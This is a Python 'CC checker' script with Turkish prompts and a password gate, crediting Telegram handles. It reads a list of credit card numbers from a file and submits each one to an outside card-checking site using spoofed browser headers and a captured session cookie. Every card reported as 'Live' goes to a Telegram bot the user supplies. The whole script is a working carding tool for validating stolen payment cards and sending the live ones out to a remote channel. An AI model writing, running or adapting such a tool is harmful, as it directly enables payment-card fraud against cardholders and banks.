import requests
import os
import time
import sys
print('''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      < CC CHECKER >
                   
    ~ Programmer : @Ciwanox | @FlexN01 | Channel: @Ciwanhackk ~
 
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')  
sifre = 'Flex'
pss = input('\x1b[1;32mTOOL ŞİFRESİ : ')
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅ ')
    time.sleep(2)
    os.system('clear')
else:
    sys.exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')

def translate():
    RED = "\033[1;91m"        
    GREEN = "\033[1;92m"      
    YELLOW = "\033[1;93m"         

    token = input(YELLOW + 'TOKEN GİR: ')
    id_telegram = input('ID GİR: ')
    file_name = input('DOSYA YOLU GİR: ')

    
 
    with open(file_name, 'r') as file:
        visa_list = file.read().splitlines()

    
    for visa in visa_list:
        url = 'https://checker.visatk.com/ccn1/alien07.php'
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB,en;q=0.9,tr-TR;q=0.8,tr;q=0.7,en-US;q=0.6',
            'content-length': '57',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': '__gads=ID=c1d904dc8d091df3-225fb18247e00013:T=1691166839:RT=1691166839:S=ALNI_MYoYYmWJaRMNOYcK_YijqwKW6AQ0g; __gpi=UID=00000c77b2c6e3ba:T=1691166839:RT=1691166839:S=ALNI_ManGmC_qU8zuQyNMQbNSw5J3kMHFA; PHPSESSID=q2ep2h2g5977bn39qbtv0uekf3; FCNEC=%5B%5B%22AKsRol-CV7xbsBLpSARmDYu9Tvuv9suohxhteHPFOy-Prutb5qKe6hT6zcqP0c0bkkONI7DzfjVUbl8Ag8PEN_g0vBIaYvJ65O13RheCfyhhQXyY1fOClvRC3WxgTL9xRaMb25wcHosNEyq9NX_wpWwoE6hCRy7ZSQ%3D%3D%22%5D%2Cnull%2C%5B%5D%5D',
            'origin': 'https://checker.visatk.com',
            'referer': 'https://checker.visatk.com/ccn1/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'ajax': '1',
            'do': 'check',
            'cclist': visa
        }

   
        response = requests.post(url, headers=headers, data=data).text


        if 'Live' in response:
            print(f'{GREEN} LİVE ✅ | {visa}')
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id_telegram}&text={visa}")

        else:
            print(f'{RED} declined ❌ {visa}')

if __name__ == "__main__":
    translate()